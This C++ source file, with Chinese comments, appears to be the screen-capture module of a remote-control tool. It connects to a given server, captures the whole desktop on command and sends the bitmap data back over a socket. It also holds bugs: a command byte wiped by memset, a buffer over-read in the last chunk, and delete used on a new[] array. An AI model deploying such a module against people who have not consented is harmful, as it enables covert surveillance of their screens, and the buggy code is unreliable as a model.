#include "stdafx.h"
#include "ScreenCommand.h"


CScreenCommand::CScreenCommand(char* szIP, int nPort)
{
    m_szIp = szIP;
    m_nPort = nPort;
    m_ClientSocket.SetComand(this);
    m_hEvent = ::CreateEvent(NULL, TRUE, FALSE, NULL);
    m_bmpdata = NULL;
}


CScreenCommand::~CScreenCommand()
{
    CloseHandle(m_hEvent);
}

void CScreenCommand::OnRecv(char* pBuffer, int nSize)
{
    //开始处理命令
    switch (pBuffer[0])
    {
    case COMMAND_Screen_BEGIN:
        SendBitmap();
        break;
    case COMMAND_Screen_DATA:
        SendBitData();
        break;
    case COMMAND_HEARTBEAT:
    {
        break;
    }
    default:
        break;
    }
}

void CScreenCommand::OnSend(char* pBuffer, int nSize)
{
    m_ClientSocket.OnSend(pBuffer, nSize);
}

void CScreenCommand::OnClose()
{
    SetEvent(m_hEvent);
}




void CScreenCommand::Execute()
{
    bool bRet = m_ClientSocket.ConnectServer(m_szIp, m_nPort);
    if (!bRet)
    {
        OutputDebugStringA("Log:连接屏幕失败");
        return;
    }
    if (m_HeratThread == INVALID_HANDLE_VALUE)
    {
        return;
    }
    char bCommand = COMMAND_Screen_OPEN;
    OutputDebugStringA("Log:发送消息");
    OnSend(&bCommand, sizeof(char));
    WaitForSingleObject(m_hEvent, INFINITE);
}

void CScreenCommand::GetScreen()
{

    CDC dc, bmpdc;                               //屏幕画布与临时画布
    int width, height;                               //屏幕的宽度和高度
    dc.CreateDC(_T("DISPLAY"), NULL, NULL, NULL);  //跟据屏幕上下文创建画布

    CBitmap bm;                                                    //定义存储屏幕图像的位图

    width = GetSystemMetrics(SM_CXSCREEN);                         //屏幕宽度

    height = GetSystemMetrics(SM_CYSCREEN);                         //屏幕高度

    bm.CreateCompatibleBitmap(&dc, width, height);                   //创建与屏幕兼容的位图

    bmpdc.CreateCompatibleDC(&dc);    //创建与屏幕画布兼容的临时画布

    bmpdc.SelectObject(&bm);                                      //选择图片

    bmpdc.BitBlt(0, 0, width, height, &dc, 0, 0, SRCCOPY);//将屏幕图像复制到位图中

    bm.GetBitmap(&m_bitmap);                                         //获取位图结构

    m_dwSize = m_bitmap.bmWidthBytes * m_bitmap.bmHeight;               //计算位图数据大小

    m_bmpdata = new char[m_dwSize];                                       //创建存储位图数据的缓冲区

    if (m_bmpdata == NULL)
    {
        return;
    }
    BITMAPINFOHEADER bih;                                     //位图信息头

    bih.biBitCount = m_bitmap.bmBitsPixel;                           //颜色位数

    bih.biClrImportant = 0;

    bih.biClrUsed = 0;

    bih.biCompression = 0;

    bih.biHeight = m_bitmap.bmHeight;                                 //位图高度

    bih.biPlanes = 1;

    bih.biSize = sizeof(BITMAPINFOHEADER);

    bih.biSizeImage = m_dwSize;                                               //位图大小

    bih.biWidth = m_bitmap.bmWidth;                                  //位图宽度

    bih.biXPelsPerMeter = 0;

    bih.biYPelsPerMeter = 0;

    //获取位图数据到bmpdata

    GetDIBits(dc, bm, 0, bih.biHeight, m_bmpdata, (BITMAPINFO*)&bih, DIB_RGB_COLORS);

}

void CScreenCommand::SendBitmap()
{
    CBuffer buf;
    GetScreen();
    char Type = COMMAND_Screen_BEGIN;
    buf.Write((PBYTE)&Type, sizeof(char));
    buf.Write((PBYTE)&m_bitmap, sizeof(BITMAP));
    //发送图片结构体
    OnSend((char*)buf.GetBuffer(), buf.GetBufferLen());
}

void CScreenCommand::SendBitData()
{
    CBuffer buf;
    char Type = COMMAND_Screen_DATA;
    buf.Write((PBYTE)&Type, sizeof(char));
    buf.Write((PBYTE)m_bmpdata, m_dwSize);
    //发送图片数据
    OnSend((char*)buf.GetBuffer(0), buf.GetBufferLen());
    delete m_bmpdata;
    m_bmpdata = NULL;
}


void CScreenCommand::SendWithSplit(char* pBuf, DWORD dwSize)
{
    //计算分几次发送
    char szBuf[1025] = { 0 };
    int nCount = dwSize / 1024;
    int nSize = dwSize % 1024;
    for (int i = 0; i < nCount;i++)
    {
        szBuf[0] = COMMAND_Screen_DATA;
        memset(szBuf, 0, 1025);
        memcpy(szBuf + 1, pBuf, 1024);
        OnSend(szBuf, 1025);
        Sleep(100);
        pBuf += 1024;
    }
    if (nSize>0)
    {
        szBuf[0] = COMMAND_Screen_DATA;
        memset(szBuf, 0, 1025);
        memcpy(szBuf + 1, pBuf, 1024);
        OnSend(szBuf, nSize+1);
    }
}
